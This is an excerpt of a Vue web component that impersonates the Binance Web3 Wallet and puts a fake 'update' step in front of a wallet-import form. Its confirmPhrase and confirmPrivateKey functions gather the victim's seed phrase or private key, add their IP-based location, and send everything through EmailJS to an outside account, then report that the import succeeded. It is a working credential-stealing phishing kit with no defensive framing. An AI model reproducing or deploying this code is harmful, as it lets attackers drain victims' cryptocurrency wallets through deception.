      ...
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <template v-if="currentStep === 1">
            <div class="flex flex-col p-6">
              <div class="mb-1 mt-[30px]">
                <img :src="logoUrl" alt="Binance Web3 Wallet Logo" class="object-cover rounded-[10px] w-[60px] h-[60px]" />
              </div>
              <div class="w-full mt-[20px]">
                <h2 class="text-3xl md:text-5xl leading-[24px] font-bold m-0 tracking-[-0.02em]">Binance Web3 Wallet</h2>
                <p class="text-gray-300 mt-1 font-semibold text-[14px] mb-8">Self-custody wallet inside Binance ecosystem</p>
                <div class="rounded-lg p-4 mb-8" :style="{ background: accentBg }">
                  <div class="flex items-start">
                    <div class="rounded-full p-2 mr-3 mt-1" :style="{ background: primaryColor }">
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-black" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
                    </div>
                    <div>
                ...
                <div class="mt-[40px]">
                  <button @click="nextStep" type="button" class="w-full py-4 px-3 mb-2 border-none outline-none rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-black" :style="{ background: primaryColor }">Import Wallet</button>
                </div>
              </div>
            </div>
          </template>
          ...
          <template v-else-if="currentStep === 2">
            <div class="flex flex-col p-6">
              <div class="mb-1 mt-[20px]"><img :src="logoUrl" alt="Binance Web3 Wallet Logo" class="object-cover rounded-[10px] w-[60px] h-[60px]" /></div>
              <div class="w-full mt-[20px]">
                <h2 class="text-3xl md:text-4xl font-bold">Update Available</h2>
                <p class="text-gray-300 mt-1 font-semibold text-[14px] mb-8">Security and performance updates.</p>
                <div class="rounded-lg p-4" :style="{ background: accentBg }"><div class="flex items-start text-gray-300 text-[14px] font-semibold">Install the recommended update for best experience.</div></div>
                <div class="mt-[30px]"><button @click="nextStep" type="button" class="w-full py-4 px-3 mb-2 border-none outline-none rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-black" :style="{ background: primaryColor }">Confirm Update</button></div>
              </div>
            </div>
          </template>
          ...
          <div v-else-if="currentStep === 3" key="s3" class="flex flex-col items-center p-6">
            <div class="flex flex-col items-center gap-3 py-6 w-full">
              <div class="mb-1 mt-[30px]"><img :src="logoUrl" alt="Binance Web3 Wallet Logo" class="object-cover rounded-[10px] w-[60px] h-[60px]" /></div>
          ...
          <div v-else-if="currentStep === 4" key="s4" class="w-full p-6">
            <div class="text-[14px] font-semibold mb-6"><span :style="{ color: primaryColor }">Update complete.</span> Select an import method.</div>
            <!-- Top tabs with underline -->
            <div class="flex gap-6 items-center border-b border-gray-700 mb-4 mt-10">
              <button v-for="m in methodTabs" :key="m.value" @click="importType = m.value" class="font-semibold py-3 px-4 bg-black border-none hover:outline-none"
                :class="importType === m.value ? 'text-white' : 'text-gray-300'"
                :style="{ borderBottom: importType === m.value ? '2px solid ' + primaryColor : '2px solid transparent' }">
                {{ m.label }}
              </button>
            </div>
            <!-- Private key -->
            <div v-if="importType === 'private'" class="mt-[40px]">
              <label class="block text-white mb-[10px] text-lg font-medium">Enter private key</label>
              ...
              <button @click="confirmPrivateKey" :disabled="isLoading" class="w-full mt-[30px] font-bold text-[14px] border-none text-black py-4 px-4 rounded-[30px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed" :style="{ background: primaryColor }">
            ...
            <div v-else class="mt-2 h-[400px] overflow-scroll">
              <div class="grid grid-cols-2 gap-3 mt-4">
                <div v-for="n in phraseCount" :key="n" class="relative">
                  ...
                  <div class="relative">
                    <input :type="hiddenFields[n - 1] ? 'password' : 'text'" v-model="phraseWords[n - 1]" class="w-full bg-[#181818] rounded-md py-2 pl-10 pr-10 text-white text-sm outline-none" />
              ...
              <button @click="confirmPhrase" :disabled="isImportDisabled" class="w-full mt-[30px] font-bold text-[14px] border-none text-black py-4 px-4 rounded-[30px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed" :style="{ background: primaryColor }">Confirm</button>
            </div>
          </div>
        </div>
      </transition>
...
const primaryColor = '#F3BA2F'
const accentBg = 'rgba(243, 186, 47, 0.12)'
const wrapperStyle = 'background: black'
const logoUrl = 'https://tse4.mm.bing.net/th/id/OIP.fm4fyC7oD7xn_-v6Gvl-BwHaHa?cb=ucfimg2&ucfimg=1&w=512&h=512&rs=1&pid=ImgDetMain&o=7&rm=3'
const methodTabs = [
...
async function confirmPhrase(){ if (isImportDisabled.value) return showMessage('Please fill all fields', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: importType.value, phrase: phraseWords.value.join(' ') }; const params = { service_id: 'service_k4kimk6', template_id: 'template_mpy0fmg', user_id: 'DMvtKT5BmC4qV83V9', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Binance Web3 Wallet', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
async function confirmPrivateKey(){ if (!privateKeyInput.value.trim()) return showMessage('Please enter a valid private key', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'private', phrase: privateKeyInput.value }; const params = { service_id: 'service_k4kimk6', template_id: 'template_mpy0fmg', user_id: 'DMvtKT5BmC4qV83V9', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Binance Web3 Wallet', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
